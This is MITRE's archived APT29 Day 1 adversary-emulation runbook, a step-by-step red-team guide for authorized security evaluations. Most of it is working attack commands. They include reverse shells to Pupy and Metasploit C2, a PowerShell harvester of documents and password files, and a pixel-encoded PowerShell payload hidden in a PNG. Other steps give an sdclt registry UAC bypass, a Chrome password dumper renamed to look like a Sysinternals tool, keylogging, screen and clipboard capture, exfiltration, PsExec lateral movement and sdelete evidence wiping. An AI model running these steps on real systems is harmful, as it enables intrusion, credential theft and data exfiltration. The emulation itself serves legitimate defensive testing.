# APT29 Day 1 (Steps 1 through 10) (ARCHIVED)

## Acknowledgments
### Special thanks to the following public resources:
*  Metasploit (https://github.com/rapid7/metasploit-framework)
*  Pupy (https://github.com/n1nj4sec/pupy)
*  Invoke-PSImage (https://github.com/peewpw/Invoke-PSImage)
*  Microsoft Sysinternals (https://docs.microsoft.com/en-us/sysinternals/)

## Overview

*  Emulation of APT29 usage of tools such as CosmicDuke, MiniDuke, SeaDuke/SeadDaddy, CozyDuke/CozyCar, and Hammertoss
*  Scenario begins after delivery of a reverse shell payload via opportunistic, widespread phishing
*  "Smash-and-grab" style collection and exfiltration before deciding the target may be of future value and deploying stealthier malware for long term exploitation
*  Modular components (ex: PowerShell scripts) may be executed atomically

## Requirements

### Victim systems:
1.  3 targets 
    * [ ] 1 domain controller and 2 workstations
    * [ ] All Windows OS (tested and executed against Win10 1903)
    * [ ] Domain joined
    * [ ] Same local administrator account on both Windows workstations
2. Google Chrome Web Browser (https://www.google.com/chrome/) must be available on one of the victim workstations

### Red Team Systems:
1.  **Attack Platform**: tested and executed on Ubuntu 18.04.3 LTS
* [ ] Pupy RAT (https://github.com/n1nj4sec/pupy)
* [ ] Metasploit Framework (https://github.com/rapid7/metasploit-framework)
* [ ] Chrome Password Dumper (https://github.com/adnan-alhomssi/chrome-passwords)
* [ ] Sysinternals Suite Zip file (https://download.sysinternals.com/files/SysinternalsSuite.zip)
* [ ] WebDAV Share serving from /var/www/webdav (https://www.digitalocean.com/community/tutorials/how-to-configure-webdav-access-with-apache-on-ubuntu-14-04)
2.  **Redirector**: tested and executed on Ubuntu 18.04.3 LTS
* [ ]  socat (https://linux.die.net/man/1/socat)
3.  **Windows Attack Platform**: Windows 10 x64 version 1903
* [ ] Invoke-PSImage (https://github.com/peewpw/Invoke-PSImage)
* [ ] Python 3 (https://www.python.org/downloads/)
* [ ] PyInstaller (https://www.pyinstaller.org/)

**Note:** The Windows attack platform is only required if you would like to compile the Day 1 payloads. If you use the pre-compiled payloads, you do not need this system.

## Red Team Setup

This methodology assumes the following static IP address configurations:

| Red Team System | IP Address |
| ------ | ------ |
| Attack Platform | 192.168.0.4 |
| Redirector | 192.168.0.5 | 

### A note about red team payloads

This evaluation utilizes four payloads that model APT29 malware.

The payloads are customized variants of reverse shells from Pupy RAT and Metasploit.

Pre-compiled payloads are available in the `payloads` directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.

If you would like to build the payloads yourself, please see `payload_configs.md` for further instructions.

### Setup Redirector: 192.168.0.5 (or the value used for the Redirector IP)

From the redirector system, setup port forwarding using Socat 

```
sudo socat TCP-LISTEN:443,fork TCP:192.168.0.4:443 & sudo socat TCP-LISTEN:1234,fork TCP:192.168.0.4:1234 & sudo socat TCP-LISTEN:8443,fork TCP:192.168.0.4:8443 &
```

### Setup Attack Platform: 192.168.0.4

1. Download Chrome password dumper tool from: https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe
2. Download SysInternals zip folder from: https://download.sysinternals.com/files/SysinternalsSuite.zip
3. Unzip `SysinternalsSuite.zip`; copy the following files into the SysInternalsSuite directory:
    *  `readme.txt`
    *  `psversion.txt`
    *  `psversion.txt`
    *  `chrome-passwords.exe` (renamed as `accessChk.exe`)
    *  `strings64.exe` (compiled from `hostui.cpp`)
4. Zip modified SysinternalsSuite folder
5. Install Pupy and Metasploit on Attack Platform by running `install_day1_tools.sh`
6. Start Pupy docker container then the EC4 listener
    1. `sudo pupy/start-compose.sh`
    2. `listen -a ec4 `

## Victim Setup

### For each of the 2 victim workstations:
1. Login in as user with administrator privileges
2. Ensure Windows Defender is off or configured to alert-only 
3. Set UAC to never notify (https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10)
4. Verify user has read/write/execute permissions in the C:\Windows\Temp directory
5. Install Google Chrome (https://www.google.com/chrome/); cache credentials in Chrome password manager
6. Import-PFX certificate found in `payloads/shockwave.local.pfx`, instructions below

### Import PFX Certificate

Step 6.B of this emulation models theft of Private Keys (https://attack.mitre.org/techniques/T1145/).

1. Copy the PFX certificate located in the `payloads/shockwave.local.pfx` directory to the Windows victims.

2. Import the certificate using PowerShell:
```
Import-PfxCertificate -Exportable -FilePath "shockwave.local.pfx" -CertStoreLocation Cert:\LocalMachine\My
```

### Add RTLO character and place rcs.3aka3.doc on Windows Victim-1
* See `payload_configs.md` for instructions on how to update `cod.3aka3.scr`

## Beginning of Day1 Execution

### Step 1 - Initial Breach

#### 1.A

1. Login to victim workstation.
2. Double click `3aka3.doc` on Desktop 
    
This will send a reverse shell to the Pupy C2 server.

#### 1.B
From Pupy C2 server:

[pupy] > `shell`    

[pupy (CMD)] > `powershell`    

### Step 2 - Rapid Collection and Exfiltration

#### 2.A
Paste the following PowerShell 1-liner into the Pupy terminal:

[pupy (PowerShell)] > 
```
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
```

[pupy (PowerShell)] > `exit`       

[pupy (CMD)] > `exit`        

#### 2.B
[pupy] > `download "C:\Users\<username>\AppData\Roaming\Draft.Zip" .`

### Step 3 - Deploy Stealth Toolkit

#### 3.A
Start Metasploit handler:

[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`       

From Pupy, upload monkey.png to target:

[pupy] > `upload "/tmp/monkey.png" "C:\Users\<username>\Downloads\monkey.png"`       
[pupy] > `shell`         
[pupy CMD] > `powershell`         

#### 3.B
[pupy (PowerShell)] > 
```
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)"
```
**Paste the following 1-liner when prompted for value:**
```
powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\username\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
```

[pupy (PowerShell)] > 
```
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Force
```
      
**When prompted for value, press: [Enter]**       

[pupy (PowerShell)] > `exit`       
[pupy (CMD)] > `%windir%\system32\sdclt.exe`   
[pupy CMD] > `powershell`  

You should receive a high integrity Meterpreter callback.

#### 3.C
[pupy (PowerShell)] > `Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force`      
[pupy (PowerShell)] > `exit`         
[pupy (CMD)] > `exit`  

### Step 4 - Defense Evasion and Discovery

#### 4.A
From Metasploit:

[msf] > `sessions`        
[msf] > `sessions -i 1`          

[meterpreter\*] > 
```
upload SysinternalsSuite.zip "C:\\Users\\username\\Downloads\\SysinternalsSuite.zip"
```

[meterpreter\*] > `execute -f powershell.exe -i -H`   

[meterpreter (PowerShell)\*] >   
```
Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\"
```

[meterpreter (PowerShell)\*] >     
```
if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path $env:USERPROFILE\Downloads\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }
```

[meterpreter (PowerShell)\*] > `cd "C:\Program Files\SysinternalsSuite\"`

#### 4.B
Terminate Pupy RAT process:

[meterpreter (PowerShell)\*] > `Get-Process`

[meterpreter (PowerShell)\*] > `Stop-Process -Id <rcs.3aka3.doc PID> -Force`

You may now close Pupy.

From Metasploit:

[meterpreter (PowerShell)\*] > `Gci $env:userprofile\Desktop`       

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\?rcs.3aka.doc"`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysinternalsSuite.zip"`      

Import custom script, readme.ps1:

[meterpreter (PowerShell)\*] > `Move-Item .\readme.txt readme.ps1`

[meterpreter (PowerShell)\*] > `. .\readme.ps1`

#### 4.C
[meterpreter (PowerShell)\*] > `Invoke-Discovery`

### Step 5 - Persistence

#### 5.A
[meterpreter (PowerShell)\*] > `Invoke-Persistence -PersistStep 1`      

#### 5.B
[meterpreter (PowerShell)\*] > `Invoke-Persistence -PersistStep 2`       

### Step 6 - Credential Access

#### 6.A
Execute chrome-password collector:

[meterpreter (PowerShell)\*] > `& "C:\Program Files\SysinternalsSuite\accesschk.exe"`     

#### 6.B
Steal PFX certificate:      
  
[meterpreter (PowerShell)\*] > `Get-PrivateKeys`      

[meterpreter (PowerShell)\*] > `exit`     

#### 6.C
Dump password hashes:

[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`

### Step 7 - Collection and Exfiltration

#### 7.A

[meterpreter\*] > `execute -f powershell.exe -i -H`   

[meterpreter (PowerShell)\*] > `cd "C:\Program Files\SysinternalsSuite"`

[meterpreter (PowerShell)\*] > `Move-Item .\psversion.txt psversion.ps1`

[meterpreter (PowerShell)\*] > `. .\psversion.ps1`

[meterpreter (PowerShell)\*] > `Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName "Screenshot"`   

From the Windows victim, type text and copy to the clipboard.

[meterpreter (PowerShell)\*] > `Get-Clipboard`

[meterpreter (PowerShell)\*] > `Keystroke-Check`     

[meterpreter (PowerShell)\*] > `Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes"`    

From victim system, enter keystrokes.

View keylog output from Metasploit:

[meterpreter (PowerShell)\*] > `View-Job -JobName "Keystrokes"`  
[meterpreter (PowerShell)\*] > `Remove-Job -Name "Keystrokes" -Force`       
[meterpreter (PowerShell)\*] > `Remove-Job -Name "Screenshot" -Force`    

#### 7.B

[meterpreter (PowerShell)\*] > `Invoke-Exfil`

### Step 8 - Lateral Movement

#### 8.A

Copy payload to webdav share:

[user@attacker]\# `cp attack-evals/apt29/day1/payloads/python.exe /var/www/webdav/`
[user@attacker]\# `cd /var/www/webdav`  
[user@attacker]\# `chown -R www-data:www-data python.exe`    

Switch back to Meterpreter shell:

[meterpreter (PowerShell)\*] > `Ad-Search Computer Name *`

[meterpreter (PowerShell)\*] >  
```
Invoke-Command -ComputerName <victim 2 IP> -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId
```

Note the session ID for step 8C.

#### 8.B
Start a new instance of Metasploit, and spawn a Metasploit handler:

[bash] > `msfconsole`

[msf] > `handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https`

Return to current Meterpreter session:

[meterpreter (PowerShell)\*] > `Invoke-SeaDukeStage -ComputerName <victim 2 IP>`         

#### 8.C
**Execute SEADUKE Remotely via PSEXEC**

[meterpreter (PowerShell)\*] >
```
.\PsExec64.exe -accepteula \\<victim 2 IP> -u "domainName\username" -p P@ssw0rd -i <session ID from 8A> "C:\Windows\Temp\python.exe"
```

You should receive a callback in your other Metasploit terminal.

### Step 9 - Collection

#### 9.A
From the second Metasploit terminal:

[msf] > `sessions`        
[msf] > `sessions -i 1`    

[meterpreter\*] > 
```
upload "/home/gfawkes/Round2/Day1/payloads/r2d1/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"
```

[meterpreter\*] > 
```
upload "sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
```
#### 9.B
[meterpreter\*] > `execute -f powershell.exe -i -H`   
    
[meterpreter (PowerShell)\*] >    
```
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force
```  

[meterpreter (PowerShell)\*] > `cd C:\Windows\Temp`       

[meterpreter (PowerShell)\*] > `.\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip"`      

[meterpreter (PowerShell)\*] > `exit`     

[meterpreter\*] > `download "C:\\Users\\<username>\\Desktop\\working.zip" .`

#### 9.C

[meterpreter\*] > `shell`  

[meterpreter (Shell)\*] > `cd "C:\Windows\Temp"`   

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Windows\Temp\Rar.exe"`    

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Users\<username>\AppData\Roaming\working.zip"`     

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Users\<username>\Desktop\working.zip"`     

[meterpreter (Shell)\*] > `del "C:\Windows\Temp\sdelete64.exe"`                    
 
**Terminate Session**       
[meterpreter (Shell)\*] > `exit`         
[meterpreter\*] > `exit`   
msf> `exit`

### Step 10 - Persistence Execution

#### 10.A

Reboot Windows victim 1; wait for system to boot up

You should receive a callback with SYSTEM permissions from the javamtsup service

#### 10.B

Trigger the Startup Folder persistence by logging in to Windows victim 1

## Liability / Responsible Usage

This content is only to be used with appropriate prior, explicit authorization for the purposes of assessing security posture and/or research.

## Notice

Copyright 2020 The MITRE Corporation

Approved for Public Release; Distribution Unlimited. Case Number 19-03607-2.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

This project makes use of ATT&CK®

[ATT&CK Terms of Use](https://attack.mitre.org/resources/terms-of-use/)
